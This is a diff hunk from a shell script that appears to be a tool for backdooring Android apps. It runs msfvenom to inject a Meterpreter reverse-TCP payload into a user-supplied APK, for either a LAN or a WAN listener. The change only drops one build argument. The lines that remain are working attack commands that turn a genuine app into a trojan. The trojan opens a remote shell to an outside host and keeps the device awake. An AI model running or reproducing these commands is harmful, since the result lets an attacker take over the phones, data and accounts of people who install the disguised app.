@@ -47,9 +47,9 @@ sleep 0.3
 printf "\n"
 
 if [[ ${lwan} == lan || ${lwan} == LAN ]]; then
-msfvenom -x $inputapk -p android/meterpreter/reverse_tcp LHOST=$lht LPORT=$lpt --platform android --arch dalvik AndroidMeterpreterDebug=true AndroidWakelock=true ${aapt_arg} -o $outputapk
+msfvenom -x $inputapk -p android/meterpreter/reverse_tcp LHOST=$lht LPORT=$lpt --platform android --arch dalvik AndroidMeterpreterDebug=true AndroidWakelock=true -o $outputapk
 elif [[ ${lwan} == wan || ${lwan} == WAN ]]; then
-msfvenom -x $inputapk -p android/meterpreter/reverse_tcp LHOST=$flht LPORT=$flpt --platform android --arch dalvik AndroidMeterpreterDebug=true AndroidWakelock=true ${aapt_arg} -o $outputapk
+msfvenom -x $inputapk -p android/meterpreter/reverse_tcp LHOST=$flht LPORT=$flpt --platform android --arch dalvik AndroidMeterpreterDebug=true AndroidWakelock=true -o $outputapk
 fi
 sleep 3
 
